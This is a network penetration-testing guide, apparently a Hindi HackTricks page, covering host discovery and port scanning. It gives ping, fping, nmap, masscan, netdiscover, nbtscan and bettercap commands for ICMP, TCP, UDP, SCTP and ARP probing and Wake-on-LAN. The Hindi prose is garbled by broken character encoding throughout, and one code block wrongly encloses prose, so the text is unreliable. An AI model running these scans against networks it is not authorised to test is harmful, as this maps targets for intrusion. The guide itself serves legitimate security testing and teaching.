# рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рдиреЗрдЯрд╡рд░реНрдХ

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╕реЗ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

## рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ

рдпрд╣ рдПрдХ **рд╕рдВрдХреНрд╖рд┐рдкреНрдд рдЕрдиреБрднрд╛рдЧ** рд╣реЛрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ **рдЗрдВрдЯрд░рдиреЗрдЯ** рд╕реЗ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗрдиреЗ рд╡рд╛рд▓реЗ IPs** рдХрд╛ рдкрддрд╛ рдХреИрд╕реЗ рд▓рдЧрд╛рдпрд╛ рдЬрд╛рдПред\
рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рдХреБрдЫ **IPs рдХрд╛ рджрд╛рдпрд░рд╛** рд╣реЛрддрд╛ рд╣реИ (рд╢рд╛рдпрдж рдХрдИ **рд░реЗрдВрдЬреЗрд╕**) рдФрд░ рдЖрдкрдХреЛ рдмрд╕ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ **рдХреМрди рд╕реЗ IPs рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рджреЗ рд░рд╣реЗ рд╣реИрдВ**ред

### ICMP

рдпрд╣ рд╣реЛрд╕реНрдЯ рдЕрдк рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдирдиреЗ рдХрд╛ **рд╕рдмрд╕реЗ рдЖрд╕рд╛рди** рдФрд░ **рд╕рдмрд╕реЗ рддреЗрдЬрд╝** рддрд░реАрдХрд╛ рд╣реИред\
рдЖрдк рдХреБрдЫ **ICMP** рдкреИрдХреЗрдЯреНрд╕ рднреЗрдЬрдХрд░ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреА рдЕрдкреЗрдХреНрд╖рд╛** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдПрдХ **рдЗрдХреЛ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ** рднреЗрдЬрдирд╛ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХрд░рдирд╛ред рдЖрдк рдпрд╣ `ping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдпрд╛ **рд░реЗрдВрдЬреЗрд╕** рдХреЗ рд▓рд┐рдП `fping` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк **nmap** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯреНрд╕ рднреА рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ (рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп ICMP рдЗрдХреЛ рд░рд┐рдХреНрд╡реЗрд╕реНрдЯ-рд░рд┐рд╕реНрдкреЙрдиреНрд╕ рдХреЗ рд▓рд┐рдП рдлрд┐рд▓реНрдЯрд░реНрд╕ рд╕реЗ рдмрдЪрдиреЗ рдореЗрдВ рдорджрдж рдХрд░реЗрдЧрд╛)ред
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдпрд╣ рдмрд╣реБрдд рдЖрдо рд╣реИ рдХрд┐ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ ICMP рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИред рддрдм, рдпрджрд┐ рдЖрдкрдХреЛ рдЬрд╛рдВрдЪрдирд╛ рд╣реИ рдХрд┐ рдХреЛрдИ рд╣реЛрд╕реНрдЯ рдЪрд╛рд▓реВ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рддреЛ рдЖрдк **рдЦреБрд▓реЗ рдкреЛрд░реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдХреЗ **65535 рдкреЛрд░реНрдЯреНрд╕** рд╣реЛрддреЗ рд╣реИрдВ, рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ "рдмрдбрд╝рд╛" рджрд╛рдпрд░рд╛ рд╣реИ рддреЛ рдЖрдк **рдирд╣реАрдВ** рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рдХрд┐ рдкреНрд░рддреНрдпреЗрдХ рд╣реЛрд╕реНрдЯ рдХрд╛ **рдкреНрд░рддреНрдпреЗрдХ рдкреЛрд░реНрдЯ** рдЦреБрд▓рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ, рдЗрд╕рдореЗрдВ рдмрд╣реБрдд рд╕рдордп рд▓рдЧреЗрдЧрд╛ред\
рддрдм, рдЖрдкрдХреЛ рдЬреЛ рдЪрд╛рд╣рд┐рдП рд╡рд╣ рд╣реИ рдПрдХ **рддреЗрдЬрд╝ рдкреЛрд░реНрдЯ рд╕реНрдХреИрдирд░** ([masscan](https://github.com/robertdavidgraham/masscan)) рдФрд░ **рдЕрдзрд┐рдХ рдкреНрд░рдпреБрдХреНрдд рдкреЛрд░реНрдЯреНрд╕ рдХреА рд╕реВрдЪреА:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
### HTTP рдкреЛрд░реНрдЯ рдбрд┐рд╕реНрдХрд╡рд░реА

рдпрд╣ рдХреЗрд╡рд▓ рдПрдХ TCP рдкреЛрд░реНрдЯ рдбрд┐рд╕реНрдХрд╡рд░реА рд╣реИ рдЬреЛ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИ рдЬрдм рдЖрдк **HTTP** **рд╕реЗрд╡рд╛рдУрдВ рдХреА рдЦреЛрдЬ рдкрд░ рдзреНрдпрд╛рди рдХреЗрдВрджреНрд░рд┐рдд рдХрд░рдирд╛** рдЪрд╛рд╣рддреЗ рд╣реИрдВ:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP рдкреЛрд░реНрдЯ рдЦреЛрдЬ

рдЖрдк рдпрд╣ рдЬрд╛рдВрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рднреА рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреЛрдИ **UDP рдкреЛрд░реНрдЯ рдЦреБрд▓рд╛** рд╣реИ рдпрд╛ рдирд╣реАрдВ, рддрд╛рдХрд┐ рддрдп рдХрд░ рд╕рдХреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЛ рдХрд┐рд╕реА **рд╣реЛрд╕реНрдЯ** рдкрд░ **рдЕрдзрд┐рдХ рдзреНрдпрд╛рди рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред** рдЪреВрдВрдХрд┐ UDP рд╕реЗрд╡рд╛рдПрдВ рдЖрдорддреМрд░ рдкрд░ рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЦрд╛рд▓реА UDP рдкреНрд░реЛрдм рдкреИрдХреЗрдЯ рдХреЗ рдЬрд╡рд╛рдм рдореЗрдВ **рдХреЛрдИ рдбреЗрдЯрд╛ рдирд╣реАрдВ рднреЗрдЬрддреАрдВ,** рдЗрд╕рд▓рд┐рдП рдпрд╣ рддрдп рдХрд░рдирд╛ рдореБрд╢реНрдХрд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдкреЛрд░реНрдЯ рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдирд┐рд░реНрдгрдп рд▓реЗрдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реИ рдХрд┐ рд╕рдВрдмрдВрдзрд┐рдд рд╕реЗрд╡рд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдкреИрдХреЗрдЯ рднреЗрдЬрд╛ рдЬрд╛рдП, рдФрд░ рдЪреВрдВрдХрд┐ рдЖрдкрдХреЛ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдХреМрди рд╕реА рд╕реЗрд╡рд╛ рдЪрд▓ рд░рд╣реА рд╣реИ, рдЖрдкрдХреЛ рдкреЛрд░реНрдЯ рдирдВрдмрд░ рдХреЗ рдЖрдзрд╛рд░ рдкрд░ рд╕рдмрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд╕реЗрд╡рд╛ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
```markdown
рдкрд╣рд▓реЗ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд nmap рд▓рд╛рдЗрди **рд╢реАрд░реНрд╖ 1000 UDP рдкреЛрд░реНрдЯреНрд╕** рдХрд╛ рдкрд░реАрдХреНрд╖рдг рд╣рд░ рд╣реЛрд╕реНрдЯ рдореЗрдВ **/24** рд░реЗрдВрдЬ рдХреЗ рдЕрдВрджрд░ рдХрд░реЗрдЧреА рд▓реЗрдХрд┐рди рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рдХреЗрд╡рд▓ рдпрд╣ рднреА **>20min** рд▓реЗрдЧрд╛ред рдпрджрд┐ рдЖрдкрдХреЛ **рд╕рдмрд╕реЗ рддреЗрдЬ рдкрд░рд┐рдгрд╛рдо** рдЪрд╛рд╣рд┐рдП рддреЛ рдЖрдк [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `./udp-proto-scanner.pl 199.66.11.53/24` рдпрд╣ рдЗрди **UDP рдкреНрд░реЛрдмреНрд╕** рдХреЛ рдЙрдирдХреЗ **рдЕрдкреЗрдХреНрд╖рд┐рдд рдкреЛрд░реНрдЯ** рдкрд░ рднреЗрдЬреЗрдЧрд╛ (рдПрдХ /24 рд░реЗрдВрдЬ рдХреЗ рд▓рд┐рдП рдпрд╣ рдХреЗрд╡рд▓ 1 рдорд┐рдирдЯ рд▓реЗрдЧрд╛): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP рдкреЛрд░реНрдЯ рдбрд┐рд╕реНрдХрд╡рд░реА
```
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## рдкреЗрдВрдЯреЗрд╕реНрдЯрд┐рдВрдЧ рд╡рд╛рдИрдлрд╛рдИ

рдпрд╣рд╛рдБ рдЖрдк рд▓реЗрдЦрди рдХреЗ рд╕рдордп рдХреЗ рд╕рднреА рдкреНрд░рд╕рд┐рджреНрдз рд╡рд╛рдИрдлрд╛рдИ рд╣рдорд▓реЛрдВ рдХрд╛ рдПрдХ рдЕрдЪреНрдЫрд╛ рдорд╛рд░реНрдЧрджрд░реНрд╢рд┐рдХрд╛ рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## рдЕрдВрджрд░ рд╕реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ

рдпрджрд┐ рдЖрдк рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рд╣реИрдВ рддреЛ рдкрд╣рд▓реА рдЪреАрдЬреЗрдВ рдЬреЛ рдЖрдк рдХрд░рдирд╛ рдЪрд╛рд╣реЗрдВрдЧреЗ рд╡рд╣ рд╣реИ **рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ** рдХрд░рдирд╛ред рдЖрдк **рдХрд┐рддрдирд╛ рд╢реЛрд░** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ/рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддреЗ рд╣реБрдП, рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

### рдкреИрд╕рд┐рд╡

рдЖрдк рдЗрди рдЙрдкрдХрд░рдгреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЬреБрдбрд╝реЗ рдиреЗрдЯрд╡рд░реНрдХ рдХреЗ рдЕрдВрджрд░ рдкреИрд╕рд┐рд╡ рд░реВрдк рд╕реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### рд╕рдХреНрд░рд┐рдп

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ [_**рдмрд╛рд╣рд░ рд╕реЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреА рдЦреЛрдЬ**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP рдкреЛрд░реНрдЯ рдЦреЛрдЬ_) рдореЗрдВ рдЪрд░реНрдЪрд┐рдд рддрдХрдиреАрдХреЗрдВ рдпрд╣рд╛рдВ рднреА **рд▓рд╛рдЧреВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ**ред\
рд▓реЗрдХрд┐рди, рдЪреВрдВрдХрд┐ рдЖрдк рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ **рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдЕрдзрд┐рдХ рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### рд╕рдХреНрд░рд┐рдп ICMP

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ _Discovering hosts from the outside_ ([_**ICMP**_](./#icmp)) рдореЗрдВ рдмрддрд╛рдИ рдЧрдИ рддрдХрдиреАрдХреЗрдВ **рдпрд╣рд╛рдБ рднреА рд▓рд╛рдЧреВ** рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред\
рд▓реЗрдХрд┐рди, рдЪреВрдВрдХрд┐ рдЖрдк **рдЕрдиреНрдп рд╣реЛрд╕реНрдЯреНрд╕ рдХреЗ рд╕рдорд╛рди рдиреЗрдЯрд╡рд░реНрдХ** рдореЗрдВ рд╣реИрдВ, рдЖрдк **рдФрд░ рднреА рдЪреАрдЬреЗрдВ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

* рдпрджрд┐ рдЖрдк **рд╕рдмрдиреЗрдЯ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ** рдХреЛ **рдкрд┐рдВрдЧ** рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдкрд┐рдВрдЧ рд╣рд░ **рд╣реЛрд╕реНрдЯ** рддрдХ рдкрд╣реБрдВрдЪрдиреА рдЪрд╛рд╣рд┐рдП рдФрд░ рд╡реЗ рдЖрдкрдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рджреЗ рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 10.10.5.255`
* **рдиреЗрдЯрд╡рд░реНрдХ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдкрддреЗ** рдХреЛ рдкрд┐рдВрдЧ рдХрд░рдХреЗ рдЖрдк **рдЕрдиреНрдп рд╕рдмрдиреЗрдЯреНрд╕** рдХреЗ рдЕрдВрджрд░ рдХреЗ рд╣реЛрд╕реНрдЯреНрд╕ рдХреЛ рднреА рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ: `ping -b 255.255.255.255`
* рд╣реЛрд╕реНрдЯ рдЦреЛрдЬ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП `nmap` рдХреЗ `-PE`, `-PP`, `-PM` рдлреНрд▓реИрдЧреНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдЬреЛ рдХреНрд░рдорд╢рдГ **ICMPv4 рдЗрдХреЛ**, **рдЯрд╛рдЗрдорд╕реНрдЯреИрдореНрдк**, рдФрд░ **рд╕рдмрдиреЗрдЯ рдорд╛рд╕реНрдХ рдЕрдиреБрд░реЛрдз** рднреЗрдЬрддреЗ рд╣реИрдВ: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрдВрдкреНрдпреВрдЯрд░реЛрдВ рдХреЛ **рдиреЗрдЯрд╡рд░реНрдХ рд╕рдВрджреЗрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ **рдЪрд╛рд▓реВ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдХрдВрдкреНрдпреВрдЯрд░ рдХреЛ рдЪрд╛рд▓реВ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕реНрддреЗрдорд╛рд▓ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдореИрдЬрд┐рдХ рдкреИрдХреЗрдЯ рдХреЗрд╡рд▓ рдПрдХ рдкреИрдХреЗрдЯ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **MAC Dst** рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ рдЙрд╕реЗ рдЙрд╕реА рдкреИрдХреЗрдЯ рдореЗрдВ **16 рдмрд╛рд░ рджреЛрд╣рд░рд╛рдпрд╛** рдЬрд╛рддрд╛ рд╣реИред\
рдлрд┐рд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рдкреИрдХреЗрдЯреНрд╕ рдЖрдорддреМрд░ рдкрд░ **рдИрдерд░рдиреЗрдЯ 0x0842** рдореЗрдВ рдпрд╛ **UDP рдкреИрдХреЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдкреЛрд░реНрдЯ 9 рдкрд░** рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред\
рдпрджрд┐ **рдХреЛрдИ \[MAC]** рдкреНрд░рджрд╛рди рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ рдкреИрдХреЗрдЯ **рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рдИрдерд░рдиреЗрдЯ** рдХреЛ рднреЗрдЬрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдФрд░ рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ MAC рд╡рд╣реА рд╣реЛрдЧрд╛ рдЬреЛ рджреЛрд╣рд░рд╛рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ)ред
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## рд╣реЛрд╕реНрдЯреНрд╕ рд╕реНрдХреИрдирд┐рдВрдЧ

рдПрдХ рдмрд╛рд░ рдЬрдм рдЖрдк рд╕рднреА рдЖрдИрдкреА (рдмрд╛рд╣рд░реА рдпрд╛ рдЖрдВрддрд░рд┐рдХ) рдХреА рдЦреЛрдЬ рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ рдЬрд┐рдиреНрд╣реЗрдВ рдЖрдк рдЧрд╣рд░рд╛рдИ рд╕реЗ рд╕реНрдХреИрди рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рд╡рд┐рднрд┐рдиреНрди рдХреНрд░рд┐рдпрд╛рдПрдВ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

### TCP

* **рдЦреБрд▓рд╛** рдкреЛрд░реНрдЯ: _SYN --> SYN/ACK --> RST_
* **рдмрдВрдж** рдкреЛрд░реНрдЯ: _SYN --> RST/ACK_
* **рдлрд╝рд┐рд▓реНрдЯрд░реНрдб** рдкреЛрд░реНрдЯ: _SYN --> \[рдХреЛрдИ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдирд╣реАрдВ]_
* **рдлрд╝рд┐рд▓реНрдЯрд░реНрдб** рдкреЛрд░реНрдЯ: _SYN --> ICMP рд╕рдВрджреЗрд╢_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP рдкреЛрд░реНрдЯ рд╕реНрдХреИрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП 2 рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ:

* **UDP рдкреИрдХреЗрдЯ** рднреЗрдЬреЗрдВ рдФрд░ рдпрджрд┐ рдкреЛрд░реНрдЯ **рдмрдВрдж** рд╣реИ рддреЛ _**ICMP unreachable**_ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ (рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ ICMP **рдлрд╝рд┐рд▓реНрдЯрд░реНрдб** рд╣реЛрдЧрд╛ рдЗрд╕рд▓рд┐рдП рдЖрдкрдХреЛ рдХреЛрдИ рдЬрд╛рдирдХрд╛рд░реА рдирд╣реАрдВ рдорд┐рд▓реЗрдЧреА рдЕрдЧрд░ рдкреЛрд░реНрдЯ рдмрдВрдж рд╣реИ рдпрд╛ рдЦреБрд▓рд╛ рд╣реИ)ред
* **рд╕реЗрд╡рд╛** рд╕реЗ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдлреЙрд░реНрдореЗрдЯреЗрдб рдбреЗрдЯрд╛рдЧреНрд░рд╛рдореНрд╕** рднреЗрдЬреЗрдВ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, DNS, DHCP, TFTP, рдФрд░ рдЕрдиреНрдп, рдЬреИрд╕рд╛ рдХрд┐ _nmap-payloads_ рдореЗрдВ рд╕реВрдЪреАрдмрджреНрдз рд╣реИ)ред рдпрджрд┐ рдЖрдкрдХреЛ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдорд┐рд▓рддреА рд╣реИ, рддреЛ, рдкреЛрд░реНрдЯ **рдЦреБрд▓рд╛** рд╣реИред

